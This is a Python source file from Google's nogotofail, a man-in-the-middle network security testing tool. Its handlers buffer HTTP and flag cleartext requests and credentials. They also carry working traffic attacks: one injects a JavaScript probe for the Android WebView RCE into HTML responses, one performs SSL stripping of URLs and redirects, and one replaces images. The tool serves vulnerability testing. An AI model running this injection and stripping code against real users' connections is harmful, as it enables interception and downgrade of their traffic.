r'''
Copyright 2014 Google Inc. All rights reserved.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
'''
import logging
from nogotofail.mitm import util
from nogotofail.mitm.connection.handlers.data import handlers
from nogotofail.mitm.connection.handlers.data import ClientReportDetection
from nogotofail.mitm.connection.handlers.data import DataHandler
from nogotofail.mitm.connection.handlers.store import handler
from nogotofail.mitm.event import connection
import re


# By making this an internal handler, it will be enabled by default and run
# before all other handlers, so that other handlers only see entire requests.
@handler(handlers, internal=True)
class BufferedHttpHandler(DataHandler):
    """Buffers messages until entire an HTTP request/response has arrived.

    This data handler doesn't call on_request or on_response before an entire
    request/response has been read. The handler does not do anything by itself,
    but when used as the first element in a chain, it effectively buffers
    requests/responses for the benefit of all following handlers.
    """

    name = "bufferedhttp"
    description = (
        "Buffer messages until entire an HTTP request/response has arrived.")

    class BufferState(object):
        """The state of a partially buffered HTTP request or response."""

        def __init__(self):
            self.reset()

        def reset(self):
            self.buffer = ""
            self.remaining = 0


    MAX_LENGTH = 2**22

    def on_select(self):
        self.request_state = BufferedHttpHandler.BufferState()
        self.response_state = BufferedHttpHandler.BufferState()

    def on_request(self, request):
        return self._handle_data(request, self.request_state)

    def on_response(self, response):
        return self._handle_data(response, self.response_state)

    # This method returns the data that we should pass downstream. The data is
    # either an empty string, or a complete HTTP request/response.
    #
    # We require HTTP requests or responses to start at the beginning of a
    # message. If they don't, we return the trailing data unmodified.
    def _handle_data(self, data, buffer_state):
        if buffer_state.remaining > 0:
            return self._handle_buffering(data, buffer_state)

        # Check for the start of an HTTP request/response. This isn't perfect
        # since we need at least the response up to the start of the body, but
        # its better than nothing.
        length = self._get_data_length(data)
        if length <= 0:
            return data
        if length > self.MAX_LENGTH:
            # Nope, not in my RAM.
            return data
        content_offset = data.find("\r\n\r\n")
        # If we cannot find the content offset, skip this request/response.
        if content_offset < 0:
            return data
        buffer_state.remaining = content_offset + length + len("\r\n\r\n")
        return self._handle_buffering(data, buffer_state)

    def _get_data_length(self, data):
        response = util.http.parse_response(data)
        if response:
            return int(response.getheader("content-length", 0))
        request = util.http.parse_request(data)
        if request:
            return int(request.headers.get("content-length", 0))

    def _handle_buffering(self, data, buffer_state):
        if len(data) >= buffer_state.remaining:
            full_data = buffer_state.buffer + data
            buffer_state.reset()
            return full_data
        else:
            buffer_state.buffer += data
            buffer_state.remaining -= len(data)
            return ""


@handler.passive(handlers)
class HttpDetectionHandler(DataHandler):

    name = "httpdetection"
    description = "Detect plaintext HTTP requests and warn on them"

    def on_request(self, request):
        http = util.http.parse_request(request)
        if http and not http.error_code:
            host = http.headers.get("host", self.connection.server_addr)
            if not self.connection.hostname:
                self.connection.hostname = host
            self.on_http(http)
        return request

    def on_http(self, http):
        host = http.headers.get("host", self.connection.server_addr)
        self.log(logging.ERROR, "HTTP request %s %s"
                 % (http.command, host + http.path))
        self.log_event(
            logging.ERROR,
            connection.AttackEvent(
                self.connection, self.name, True,
                host + http.path))
        self.connection.vuln_notify(util.vuln.VULN_CLEARTEXT_HTTP)


@handler.passive(handlers)
class HttpAuthHandler(HttpDetectionHandler):

    name = "httpauthdetection"
    description = "Detect authorization headers in HTTP requests"

    def on_http(self, http):
        auth = http.headers.get("Authorization", None)
        host = http.headers.get("host", self.connection.server_addr)
        if auth:
            self.log(
                logging.CRITICAL,
                "Authorization header in HTTP request %s %s" %
                (http.command, host + http.path))
            self.log_event(
                logging.ERROR,
                connection.AttackEvent(
                    self.connection, self.name, True,
                    host + http.path))
            self.connection.vuln_notify(util.vuln.VULN_CLEARTEXT_AUTH)


class _HttpReqReplacement(DataHandler):
    """Basic class for replacing the conents of a HTTP Request
    """

    def filter(self, http):
        return False

    def replace(self, http):
        return ""

    def on_request(self, request):
        http = util.http.parse_request(request)
        if http and not http.error_code:
            host = http.headers.get("host", self.connection.server_addr)
            if not self.connection.hostname:
                self.connection.hostname = host
            if self.filter(http):
                return self.replace(http)
        return request


class _ResponseReplacement(DataHandler):
    """Basic class for replacing the contents of a HTTP response
    """
    skip = 0

    def filter(self, data):
        return False

    def replace(self, data):
        return ""

    def on_response(self, request):
        if self.skip > 0:
            if self.skip >= len(request):
                self.skip -= len(request)
                return ""
            request = request[self.skip:]
            self.skip = 0
        if self.filter(request):
            return self.replace(request)
        return request


@handler(handlers, default=False)
class AndroidWebviewJsRce(_ResponseReplacement):

    name = "androidwebviewjsrce"
    description = "Detect Android Webview Javascript RCE"
    base_url = "/favicon.ico"
    base_payload = """
    <script language='Javascript'>
    for (i in window.top) {
        var o = top[i];
        try {
            o.getClass().forName('java.lang.Runtime');
            document.write('<img src=\"%s\" style=\"display:none;\" width=\"1\" height=\"1\"/>');
        } catch (e) {}
    };</script>"""

    def filter(self, data):
        resp = util.http.parse_response(data)
        return (resp and resp.status == 200 and
                resp.getheader("content-type", "").startswith("text/html"))

    def build_payload(self):
        url = ClientReportDetection.add_callback_url(
            self.on_report, self.base_url)
        return self.base_payload % (url)

    def on_report(self, data):
        if data is None:
            return

        self.log(
            logging.CRITICAL,
            "Client is vulnerable to Android Javascript RCE")
        self.log_event(
            logging.ERROR,
            connection.AttackEvent(self.connection, self.name, True, None))
        self.connection.vuln_notify(util.vuln.VULN_ANDROID_JAVASCRIPT_RCE)
        return False

    def replace(self, response):
        resp = util.http.parse_response(response)
        headers = dict(resp.getheaders())
        old_length = int(headers.get("content-length", 0))
        contents = resp.read(old_length)
        # Look for the <body> tag and inject the script after
        # HACK: Parsing HTML with regex is evil and broken but proper parsing is
        # hard
        match = re.search("<body.*>", contents)
        if not match:
            return response
        payload = self.build_payload()
        contents = contents[:match.end()] + payload + contents[match.end():]

        message = ("{version} 200 OK\r\n" + "\r\n".join(
            ["%s: %s" % (k, v) for k, v in headers.items()]) + "\r\n\r\n" + "{data}")

        headers["content-length"] = old_length + len(payload)
        version = "HTTP/1.0" if resp.version == 10 else "HTTP/1.1"
        data = message.format(version=version, data=contents)

        # Handle any extra data in response after the HTTP response
        total_consumed = response.index("\r\n\r\n") + 4 + old_length
        if total_consumed < len(response):
            data += response[total_consumed:]
        return data


@handler(handlers, default=False)
class SSLStrip(_ResponseReplacement):
    """Replace https urls with http. Uses the reporting mechanism to
    detect when these URLs are later visited and warns/notifies.
    """

    name = "sslstrip"
    description = (
        "Runs sslstrip on http traffic. Detects when sslstrip'd urls are visited.")
    content_types = [
        "application/json",
        "application/javascript",
        "application/x-javascript",
        "application/xml",
        "application/xhtml",
        "application/xhtml+xml",
        "text/.*",
    ]

    def filter(self, data):
        resp = util.http.parse_response(data)
        content_type = resp.getheader(
            "content-type", "").strip() if resp else ""
        return resp and (
            (resp.status == 200 and any(
                re.match(type, content_type)
                for type in SSLStrip.content_types))
            or (resp.status / 100 == 3  # 3XX are HTTP redirects
                and resp.getheader("location", "").startswith("https://")))

    def replace(self, response):
        resp = util.http.parse_response(response)
        if resp.status == 200:
            return self.replace_ok(response)
        elif resp.status / 100 == 3:
            return self.replace_redirect(response)
        else:
            self.log(
                logging.FATAL,
                "Unexpected status %s in SSLstrip replace" % resp.status)
            return ""

    def build_report_callback(self, url):
        def on_report(data):
            if data is None:
                return

            self.log(logging.CRITICAL, "SSLStrip'd URL %s was visited!" % url)
            self.log_event(
                logging.CRITICAL,
                connection.AttackEvent(
                    self.connection, self.name, True, url))
            self.connection.vuln_notify(util.vuln.VULN_SSL_STRIP)
            return False
        return on_report

    def replace_ok(self, response):
        """Handle sslstrip on HTTP responses that contain data.

        This goes through and replaces URLs in the response content.
        """
        resp = util.http.parse_response(response)
        headers = dict(resp.getheaders())
        old_length = int(headers.get("content-length", 0))
        contents = resp.read(old_length)

        new_contents = ""
        prev = 0
        # Not perfect but hopefully close enough.
        urls = re.finditer(
            "https://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+",
            contents)
        for match in urls:
            url = match.group(0)
            callback = self.build_report_callback(url)
            # strip the https
            url = "http://" + url[8:]
            new_url = ClientReportDetection.add_callback_url(
                callback, url, timeout=20)
            new_contents += contents[prev:match.start()] + new_url
            prev = match.end()
            self.log(
                logging.DEBUG,
                "Replacing %s with %s" % (match.group(0), new_url))
        new_contents += contents[prev:]

        headers["content-length"] = len(new_contents)
        version = "HTTP/1.0" if resp.version == 10 else "HTTP/1.1"

        message = ("{version} 200 OK\r\n" + "\r\n".join(
            ["%s: %s" % (k, v) for k, v in headers.items()]) + "\r\n\r\n" + "{data}")
        data = message.format(version=version, data=new_contents)

        # Handle any extra data in response after the HTTP response
        total_consumed = response.index("\r\n\r\n") + 4 + old_length
        if total_consumed < len(response):
            data += response[total_consumed:]

        return data

    def replace_redirect(self, response):
        """Handle sslstrip for HTTP redirects.

        This does SSLstrip on the Location header.
        """
        resp = util.http.parse_response(response)
        headers = dict(resp.getheaders())
        location = headers["location"]
        callback = self.build_report_callback(location)
        new_location = "http://" + location[8:]
        new_location = ClientReportDetection.add_callback_url(
            callback, new_location, timeout=5)
        headers["location"] = new_location
        self.log(logging.DEBUG,
                 "Replacing redirect to %s with %s" %
                 (location, new_location))
        version = "HTTP/1.0" if resp.version == 10 else "HTTP/1.1"

        message = ("{version} {status} OK\r\n" + "\r\n".join(
            ["%s: %s" % (k, v) for k, v in headers.items()]) + "\r\n\r\n")
        data = message.format(version=version, status=resp.status)

        # Handle any extra data in response after the HTTP response
        total_consumed = response.index(
            "\r\n\r\n") + 4 + int(headers.get("content-length", 0))
        if total_consumed < len(response):
            data += response[total_consumed:]
        return data


@handler(handlers)
class ImageReplacement(_ResponseReplacement):
    """Replace images downloaded over HTTP with replace.png.
    Useful for detecting mixed content and a bit of a laugh.
    """

    name = "imagereplace"
    description = (
        "Replace responses with Content-Type of image/* with replace.png")
    file = "replace.png"
    data = None

    def filter(self, response):
        resp = util.http.parse_response(response)
        return (resp and resp.status == 200
                and resp.getheader("content-type", "").startswith("image/")
                and response.find("\r\n\r\n") != -1)

    def replace(self, response):
        resp = util.http.parse_response(response)
        headers = dict(resp.getheaders())
        if not ImageReplacement.data:
            with open(util.extras.get_extras_path(self.file)) as f:
                ImageReplacement.data = f.read()
        old_length = int(headers.get("content-length", 0))
        length = len(self.data)
        headers["content-length"] = length
        headers["content-type"] = "image/png"

        message = ("{version} 200 OK\r\n" + "\r\n".join(
            ["%s: %s" % (k, v) for k, v in headers.items()]) + "\r\n\r\n" + "{data}")
        # HTTPResponse.version is kind of weird
        version = "HTTP/1.0" if resp.version == 10 else "HTTP/1.1"
        data = message.format(version=version, data=self.data)
        # figure out if we need to skip data
        if old_length > 0:
            content_offset = response.find("\r\n\r\n")
            total_length = content_offset + old_length
            if len(response) < total_length:
                self.skip = total_length - len(response)
        return data

@handler(handlers, default=False)
class BlockHTTP(HttpDetectionHandler):
    """Simple handler that drops connections doing HTTP
    """

    name = "blockhttp"
    description = "Block HTTP traffic"

    def on_http(self, http):
        self.connection.close()

@handler(handlers)
class DisableCDCPEncryption(HttpDetectionHandler):
    """Disable the Chrome Data Compression Proxy encryption.
    See https://support.google.com/chrome/answer/3517349
    """
    name = "disablecdcpencryption"
    description = "Disable Chrome Data Compression Proxy encryption"

    def on_http(self, http):
        host = http.headers.get("host")
        path = http.path
        if host == "check.googlezip.net" and path == "/connect":
            self.connection.close()
